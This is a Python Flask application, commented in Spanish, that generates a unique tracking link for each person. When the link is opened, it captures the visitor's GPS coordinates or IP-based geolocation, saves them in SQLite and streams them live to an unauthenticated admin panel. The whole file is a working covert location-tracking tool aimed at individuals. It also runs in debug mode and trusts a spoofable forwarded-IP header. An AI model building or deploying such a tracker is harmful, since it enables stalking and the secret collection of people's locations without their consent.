from flask import Flask, request, render_template, jsonify
from flask_socketio import SocketIO
import geoip2.database
import sqlite3
import uuid

app = Flask(__name__)
socketio = SocketIO(app)

# Ruta al archivo de base de datos GeoLite2
GEOIP_DB_PATH = "data/GeoLite2-City.mmdb"

# Configuración de la base de datos SQLite
DB_PATH = "data/tracker.db"

# Inicializar la base de datos SQLite
def init_db():
    with sqlite3.connect(DB_PATH) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS locations (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                person_id TEXT NOT NULL,
                method TEXT NOT NULL,
                ip TEXT,
                city TEXT,
                region TEXT,
                country TEXT,
                latitude REAL,
                longitude REAL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS tracking_links (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                person_id TEXT NOT NULL,
                tracking_url TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        conn.commit()

init_db()

# Obtener la IP real del cliente detrás de un proxy
def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0]
    return request.remote_addr

@app.route('/admin')
def admin_panel():
    with sqlite3.connect(DB_PATH) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            SELECT t.person_id, t.tracking_url, l.city, l.region, l.country, l.latitude, l.longitude, l.timestamp
            FROM tracking_links t
            LEFT JOIN locations l ON t.person_id = l.person_id
            ORDER BY t.created_at DESC
        ''')
        links = cursor.fetchall()

    return render_template("admin.html", links=links)

@app.route('/generate', methods=['POST'])
def generate_url():
    person_id = str(uuid.uuid4())
    tracking_url = f"https://your-domain.com/track/{person_id}"
    with sqlite3.connect(DB_PATH) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO tracking_links (person_id, tracking_url)
            VALUES (?, ?)
        ''', (person_id, tracking_url))
        conn.commit()

    # Emitir evento para actualizar el panel en tiempo real
    socketio.emit('new_link', {'person_id': person_id, 'tracking_url': tracking_url})
    return jsonify({"tracking_url": tracking_url})

@app.route('/track/<person_id>', methods=['GET'])
def track_page(person_id):
    return render_template("track.html", person_id=person_id)

@app.route('/track/<person_id>/submit', methods=['POST'])
def track(person_id):
    data = request.json

    # Rastrear por GPS (latitud y longitud enviadas desde el cliente)
    if 'latitude' in data and 'longitude' in data:
        gps_location = {
            "latitude": data['latitude'],
            "longitude": data['longitude']
        }
        save_location(person_id, "gps", gps_location)
        return jsonify({"method": "gps", "location": gps_location})

    # Rastrear por IP usando la base de datos GeoLite2
    ip_address = get_client_ip()
    try:
        with geoip2.database.Reader(GEOIP_DB_PATH) as reader:
            response = reader.city(ip_address)
            ip_location = {
                "ip": ip_address,
                "city": response.city.name,
                "region": response.subdivisions.most_specific.name,
                "country": response.country.name,
                "latitude": response.location.latitude,
                "longitude": response.location.longitude
            }
            save_location(person_id, "ip", ip_location)
            return jsonify({"method": "ip", "location": ip_location})
    except Exception as e:
        return jsonify({"error": f"Unable to track IP: {str(e)}"}), 400

# Guardar ubicación en SQLite y emitir evento
def save_location(person_id, method, location_data):
    with sqlite3.connect(DB_PATH) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO locations (person_id, method, ip, city, region, country, latitude, longitude)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            person_id,
            method,
            location_data.get("ip"),
            location_data.get("city"),
            location_data.get("region"),
            location_data.get("country"),
            location_data.get("latitude"),
            location_data.get("longitude")
        ))
        conn.commit()

    # Emitir evento para actualizar el panel en tiempo real
    socketio.emit('location_update', {
        "person_id": person_id,
        "method": method,
        **location_data
    })

if __name__ == '__main__':
    socketio.run(app, debug=True)
